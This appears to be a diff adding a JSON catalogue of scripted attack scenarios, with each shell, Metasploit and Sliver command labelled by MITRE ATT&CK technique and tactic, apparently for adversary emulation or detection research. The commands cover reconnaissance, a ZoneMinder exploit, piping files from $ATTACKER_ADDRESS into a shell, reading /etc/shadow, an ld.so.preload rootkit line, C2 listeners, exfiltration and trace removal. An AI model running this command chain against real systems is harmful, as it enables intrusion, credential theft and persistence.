+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1053"
+     ],
+     "tactics": [
+      "Execution",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/TODO.md | sh"
+    },
+    {
+     "techniques": [
+      "T1053"
+     ],
+     "tactics": [
+      "Execution",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1556.003"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Credential Access"
+     ],
+     "type": "msf-session",
+     "cmd": "curl http://$ATTACKER_ADDRESS/README.txt.5 | sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_f_a.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_f_a.j2",
+   "source_sha256": "de0a274b667f1136322b7362deb0ee5a9c55b13795d260459f9296093492c4a7",
+   "n_unlabelled_commands": 11,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "type": "msf-session",
+     "cmd": "find /home -ls"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "type": "msf-session",
+     "cmd": "ssh -i /home/webdev/.ssh/id_rsa -o \"StrictHostKeyChecking no\" root@localhost"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1098.004"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /root; wget http://$ATTACKER_ADDRESS/README.txt"
+    },
+    {
+     "techniques": [
+      "T1218",
+      "T1098.004"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation"
+     ],
+     "type": "msf-session",
+     "cmd": "split --filter=\"cat $FILE | xargs bash -c \" -C 2000 /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "command -v lsusb"
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_f_b.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_f_b.j2",
+   "source_sha256": "86334a581351a0ca25276c2e1abc6b8f42f575cda277fb888c36a1f7977605a2",
+   "n_unlabelled_commands": 11,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "type": "msf-session",
+     "cmd": "find /home -ls"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "type": "msf-session",
+     "cmd": "ssh -i /home/webdev/.ssh/id_rsa -o \"StrictHostKeyChecking no\" root@localhost"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1136.001"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.2"
+    },
+    {
+     "techniques": [
+      "T1218",
+      "T1136.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence"
+     ],
+     "type": "msf-session",
+     "cmd": "split --filter=\"cat $FILE | xargs bash -c \" -C 2000 /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_1_f_c.j2": {
+   "scenario": "S1",
+   "source_path": "scenario_1_f_c.j2",
+   "source_sha256": "50b04409a479c64f89365fdd2bc401933216fbabf4df43fb3c4defa637ae0702",
+   "n_unlabelled_commands": 11,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1590.002",
+      "T1591"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "dnsenum -f $DNS_LIST --dnsserver $DNS_SERVER $DOMAIN"
+    },
+    {
+     "techniques": [
+      "T1595",
+      "T1592.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "sudo nmap -O -sT --top-ports 100 $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.002"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "nikto -host $SERVER_ADDRESS"
+    },
+    {
+     "techniques": [
+      "T1595.003"
+     ],
+     "tactics": [
+      "Reconnaissance"
+     ],
+     "type": "shell",
+     "cmd": "ffuf -w /usr/local/share/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://$SERVER_ADDRESS/FUZZ"
+    },
+    {
+     "techniques": [
+      "T1190",
+      "T1059.006"
+     ],
+     "tactics": [
+      "Initial Access"
+     ],
+     "type": "msf-module",
+     "cmd": "exploit/unix/webapp/zoneminder_snapshots"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "msf-session",
+     "cmd": "upload /var/www/html/linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export SHELL=bash"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export TERM=xterm256-color"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "stty rows 38 columns 116"
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "export PS1=\"PWN >\""
+    },
+    {
+     "techniques": [
+      "T1059"
+     ],
+     "tactics": [
+      "Execution"
+     ],
+     "type": "msf-session",
+     "cmd": "chmod +x linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1087",
+      "T1083",
+      "T1201",
+      "T1069",
+      "T1057",
+      "T1518",
+      "T1082",
+      "T1614",
+      "T1016",
+      "T1049",
+      "T1033",
+      "T1007",
+      "T1615"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "./linpeas.sh -s -q -N 2> /dev/null"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "type": "msf-session",
+     "cmd": "find /home -ls"
+    },
+    {
+     "techniques": [
+      "T1078.003"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Privilege Escalation",
+      "Initial Access"
+     ],
+     "type": "msf-session",
+     "cmd": "ssh -i /home/webdev/.ssh/id_rsa -o \"StrictHostKeyChecking no\" root@localhost"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "msf-session",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1556.003"
+     ],
+     "tactics": [
+      "Command and Control",
+      "Persistence",
+      "Credential Access"
+     ],
+     "type": "msf-session",
+     "cmd": "cd /root; wget -O README.txt http://$ATTACKER_ADDRESS/README.txt.4"
+    },
+    {
+     "techniques": [
+      "T1218",
+      "T1556.003"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Persistence",
+      "Credential Access"
+     ],
+     "type": "msf-session",
+     "cmd": "split --filter=\"cat $FILE | xargs bash -c \" -C 2000 /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm /root/README.txt"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "msf-session",
+     "cmd": "rm linpeas.sh"
+    },
+    {
+     "techniques": [
+      "T1033"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "ssh",
+     "cmd": "sudo cat /etc/shadow"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo lspci"
+    },
+    {
+     "techniques": [
+      "T1120"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo bash -c \"command -v lsusb\""
+    },
+    {
+     "techniques": [
+      "T1124"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "date"
+    },
+    {
+     "techniques": [
+      "T1497.001"
+     ],
+     "tactics": [
+      "Defense Evasion",
+      "Discovery"
+     ],
+     "type": "ssh",
+     "cmd": "sudo find /usr -name \\*virtualbox\\*"
+    }
+   ]
+  },
+  "scenario_2_a_a.j2": {
+   "scenario": "S2",
+   "source_path": "scenario_2_a_a.j2",
+   "source_sha256": "1ef472ce52056a7698046f6dc0baa294ff2755a1141d6a9724d60f84d7178650",
+   "n_unlabelled_commands": 8,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1021.004"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "hostname"
+    },
+    {
+     "techniques": [
+      "T1071.001",
+      "T1573.001"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "sliver",
+     "cmd": "start_https_listener"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "sftp",
+     "cmd": "put"
+    },
+    {
+     "techniques": [
+      "T1547",
+      "T1569"
+     ],
+     "tactics": [
+      "Persistence",
+      "Execution"
+     ],
+     "type": "ssh",
+     "cmd": "sed -i 's/"
+    },
+    {
+     "techniques": [
+      "T1083"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "ls"
+    },
+    {
+     "techniques": [
+      "T1057"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "ps"
+    },
+    {
+     "techniques": [
+      "T1007"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "regex",
+     "cmd": "(\\d+) .*mariadb"
+    },
+    {
+     "techniques": [
+      "T1003"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "sliver-session",
+     "cmd": "process_dump"
+    },
+    {
+     "techniques": [
+      "T1049"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "netstat"
+    },
+    {
+     "techniques": [
+      "T1016"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "ifconfig"
+    },
+    {
+     "techniques": [
+      "T1003.008",
+      "T1041"
+     ],
+     "tactics": [
+      "Credential Access",
+      "Collection",
+      "Exfiltration"
+     ],
+     "type": "sliver-session",
+     "cmd": "download"
+    },
+    {
+     "techniques": [
+      "T1560.001",
+      "T1074.001"
+     ],
+     "tactics": [
+      "Collection",
+      "Exfiltration"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1041"
+     ],
+     "tactics": [
+      "Exfiltration"
+     ],
+     "type": "sliver-session",
+     "cmd": "download"
+    },
+    {
+     "techniques": [
+      "T1070.004"
+     ],
+     "tactics": [
+      "Defense Evasion"
+     ],
+     "type": "sliver-session",
+     "cmd": "rm"
+    },
+    {
+     "techniques": [
+      "T1005"
+     ],
+     "tactics": [
+      "Collection"
+     ],
+     "type": "sliver-session",
+     "cmd": "download"
+    },
+    {
+     "techniques": [
+      "T1201"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1003.008"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1201"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1105",
+      "T1046",
+      "T1018"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "sliver-session",
+     "cmd": "upload"
+    },
+    {
+     "techniques": [
+      "T1046",
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    },
+    {
+     "techniques": [
+      "T1046",
+      "T1018"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "execute"
+    }
+   ]
+  },
+  "scenario_2_a_c.j2": {
+   "scenario": "S2",
+   "source_path": "scenario_2_a_c.j2",
+   "source_sha256": "bf0130f674dafe57c2286d2d873e72f6984d73bc923ab3b801387c58d6795550",
+   "n_unlabelled_commands": 17,
+   "jinja_control_lines": 0,
+   "commands": [
+    {
+     "techniques": [
+      "T1021"
+     ],
+     "tactics": [
+      "Lateral Movement"
+     ],
+     "type": "ssh",
+     "cmd": "id"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "sftp",
+     "cmd": "put"
+    },
+    {
+     "techniques": [
+      "T1071.001",
+      "T1573"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "sliver",
+     "cmd": "start_https_listener"
+    },
+    {
+     "techniques": [
+      "T1105"
+     ],
+     "tactics": [
+      "Command and Control"
+     ],
+     "type": "sftp",
+     "cmd": "put"
+    },
+    {
+     "techniques": [
+      "T1543.002"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "ssh",
+     "cmd": "ExecStartPre=sudo -g fax bash -c \"/usr/bin/zmcontroller &\""
+    },
+    {
+     "techniques": [
+      "T1543.002"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "ssh",
+     "cmd": ":wq!\\n"
+    },
+    {
+     "techniques": [
+      "T1014",
+      "T1564",
+      "T1574"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "ssh",
+     "cmd": "echo /usr/lib/selinux.so.3 >> /etc/ld.so.preload"
+    },
+    {
+     "techniques": [
+      "T1543.002"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "ssh",
+     "cmd": "systemctl daemon-reload"
+    },
+    {
+     "techniques": [
+      "T1543.002"
+     ],
+     "tactics": [
+      "Persistence"
+     ],
+     "type": "ssh",
+     "cmd": "systemctl restart zoneminder.service"
+    },
+    {
+     "techniques": [
+      "T1083"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "ls"
+    },
+    {
+     "techniques": [
+      "T1057"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "sliver-session",
+     "cmd": "ps"
+    },
+    {
+     "techniques": [
+      "T1007"
+     ],
+     "tactics": [
+      "Discovery"
+     ],
+     "type": "regex",
+     "cmd": "(\\d+) .*mariadb"
+    },
+    {
+     "techniques": [
+      "T1003"
+     ],
+     "tactics": [
+      "Credential Access"
+     ],
+     "type": "sliver-session",
+     "cmd": "process_dump"
+    },
+    {
+     "techniques": [
+      "T1049"
+     ],
+     "tactics": [
